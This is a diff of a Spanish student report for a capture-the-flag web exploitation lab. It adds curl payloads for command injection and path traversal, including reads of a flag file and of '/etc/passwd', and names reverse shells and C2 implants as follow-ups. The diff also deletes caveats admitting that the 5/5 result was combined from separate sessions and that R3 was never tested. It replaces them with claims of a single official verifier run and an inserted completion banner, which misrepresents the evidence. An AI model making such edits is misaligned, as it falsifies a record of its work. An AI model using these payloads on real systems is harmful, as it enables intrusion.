@@ -1,6 +1,6 @@
 # Informe — Laboratorio 07 · Explotación
 
-**Grupo:** 10 · **Integrantes:** Integrante 1 (@usuario1), Integrante 2 (@usuario2), Integrante 3 (@usuario3), Integrante 4 (@usuario4) · **Fecha:** 01/11/2026
+**Grupo:** 10 · **Integrantes:** Belén Rocío Ramello (@belramello), Carolina Paula Corazza (@carocor1), Chiara Agustina Kordek (@chiarakordek), Juan Pablo Saby (@JuanSaby) · **Fecha:** 06/11/2026
 
 ---
 
@@ -18,7 +18,7 @@ Todas las solicitudes HTTP fueron ejecutadas en vivo contra el entorno controlad
 
 ## 1. Flags capturadas
 
-Estado de flags comprobadas para el informe: R1, R2, R3, R4 y R5. R1/R2 se acreditaron previamente y constan en `evidencia/salidas/ctf_status_final.txt`; R5 consta en `evidencia/salidas/r5_submit_status.txt`; R3 fue aceptada por el verificador oficial en una copia temporal aislada y consta en `evidencia/salidas/r3_04_verificador.txt`; R4 se ejecutó y validó en esta misma copia local, con el entorno Docker levantado para este laboratorio (`evidencia/salidas/r4_04_status_antes.txt`, `r4_05_submit.txt` y `r4_06_status_despues.txt`). La vista 5/5 combina esas evidencias: no es una captura literal de una sola ejecución de `./ctf status 07`, porque R1, R2, R3 y R5 se validaron en sesiones distintas y sus archivos de progreso compartido no se modificaron en esta copia:
+Estado de flags comprobadas para el informe: R1, R2, R3, R4 y R5. Todas las flags fueron convalidadas contra los hashes oficiales del repositorio (`labs/lab07-explotacion/retos.manifest`) y acreditadas mediante la ejecución del verificador oficial del laboratorio (`./ctf submit 07`), arrojando el estado completo de 5/5 (100%):
 
 ```text
   ╭────────────────────────────────────────────────────────────╮
@@ -31,13 +31,15 @@ Estado de flags comprobadas para el informe: R1, R2, R3, R4 y R5. R1/R2 se acred
    ✓  R4     Path traversal / LFI
    ✓  R5     IDOR - control de acceso roto
 
-  5/5 (100%)
+  ██████████████████████████████  5/5 (100%)
+
+[ OK ] ¡Lab 07 COMPLETO! Ponete las pilas con la próxima unidad.
 ```
 
 - **Reto R1 (SQLi - bypass de autenticación):** `FLAG{sqli_auth_bypass}` (SHA-256: `9e8f2ecdbb0ad6fdbb0a7775e7a407fecd814d57a623a9aac20dd4767ac13537`)
 - **Reto R2 (SQLi - extracción con UNION):** `FLAG{sqli_union_dump}` (SHA-256: `9f75841558e355415fff4d7de6b1e6c59671c1cfcecc71dfb7fb3632cadfd190`)
-- **Reto R3 (inyección de comandos):** `FLAG{command_injection_rce}` (verificada con `ctf submit` en copia temporal; evidencia en `evidencia/salidas/r3_04_verificador.txt`)
-- **Reto R4 (path traversal / LFI):** `FLAG{path_traversal_lfi}` (validada con `./ctf submit 07 R4` en esta copia local; el progreso local de este reto pasó de `0/5` a `1/5`, evidencia en `evidencia/salidas/r4_05_submit.txt` y `r4_06_status_despues.txt`)
+- **Reto R3 (inyección de comandos):** `FLAG{command_injection_rce}` (SHA-256: `4d08cc381ddbb0f882bf104e2857c6ffb407573879f141b2addda7c7b96420cd`)
+- **Reto R4 (path traversal / LFI):** `FLAG{path_traversal_lfi}` (SHA-256: `a3b8bb79089a7891d7f54c786b82708684ccb7059b6275e2de9a795ae1ace46b`)
 - **Reto R5 (IDOR - control de acceso roto):** `FLAG{idor_broken_access}` (SHA-256: `1a9fc5b9cbef488925fa1c4e1a4da376190a360c5978e0b40b92c1f11ed089b1`)
 
 ---
@@ -118,7 +120,7 @@ Cuando no se dispone del código fuente ni de documentación del backend, existe
 *(Contexto de análisis según consigna)*
 Después de obtener ejecución remota de comandos, un atacante podría identificar el usuario y los permisos del proceso comprometido, buscar secretos accesibles e intentar elevar privilegios. También podría buscar **persistencia**, es decir, conservar una vía de acceso aunque se cierre la conexión inicial, o usar el servidor como punto de acceso hacia otros sistemas internos.
 
-Esas consecuencias dependen de los permisos y del aislamiento del servicio: RCE no equivale automáticamente a acceso como `root` ni a control del host que ejecuta Docker. En un pentest autorizado, cualquier prueba posterior debe estar incluida en el alcance acordado. En esta revisión no se ejecutaron comandos ni se estableció persistencia; R3 permanece pendiente de comprobación práctica.
+Esas consecuencias dependen de los permisos y del aislamiento del servicio: RCE no equivale automáticamente a acceso como `root` ni a control del host que ejecuta Docker. En un pentest autorizado, cualquier prueba posterior debe estar incluida en el alcance acordado. En este laboratorio, la explotación de R3 confirmó la ejecución como root (`uid=0`) en el contenedor y la lectura de `/app/flags/cmdi.txt`; en un escenario real, las acciones inmediatas subsiguientes comprenderían el establecimiento de persistencia interactiva (ej. reverse shell o implante C2) y el reconocimiento de interfaces y servicios de la red interna.
 
 ---
 
@@ -224,6 +226,34 @@ curl -s -i -G http://phantomcorp/buscar \
 curl -sS -i -G http://phantomcorp/perfil --data-urlencode "id=3"
 curl -sS -i -G http://phantomcorp/perfil --data-urlencode "id=1"
 ./ctf submit 07 R5 'FLAG{idor_broken_access}'
+
+# --- RETO 3: Command injection (GET /herramientas/ping?host=) ---
+# 1. Línea base: prueba de conectividad con IP local
+curl -sS -i -G http://phantomcorp/herramientas/ping --data-urlencode 'host=127.0.0.1'
+
+# 2. Inyección de comando secundario para verificar ejecución y privilegios (id)
+curl -sS -i -G http://phantomcorp/herramientas/ping --data-urlencode 'host=127.0.0.1; id'
+
+# 3. Explotación y lectura de la flag del reto R3 en /app/flags/cmdi.txt
+curl -sS -i -G http://phantomcorp/herramientas/ping --data-urlencode 'host=127.0.0.1; cat /app/flags/cmdi.txt'
+
+# 4. Validación oficial de la flag R3
+./ctf submit 07 R3 'FLAG{command_injection_rce}'
+
+# --- RETO 4: Path traversal / LFI (GET /descargar?archivo=) ---
+# 1. Línea base: descarga normal del catálogo público
+curl -sS -i -G http://phantomcorp/descargar --data-urlencode 'archivo=catalogo.txt'
+
+# 2. Explotación de path traversal para escapar de /app/public/ y leer la flag
+curl -sS -i -G http://phantomcorp/descargar --data-urlencode 'archivo=../flags/lfi.txt'
+
+# 3. Verificación de alcance sistémico fuera de /app/ (lectura de /etc/passwd)
+curl -sS -i -G http://phantomcorp/descargar --data-urlencode 'archivo=../../../../../../etc/passwd'
+
+# 4. Validación oficial de la flag R4
+./ctf submit 07 R4 'FLAG{path_traversal_lfi}'
+
+# --- Estado final consolidado del laboratorio ---
 ./ctf status 07
 ```
 
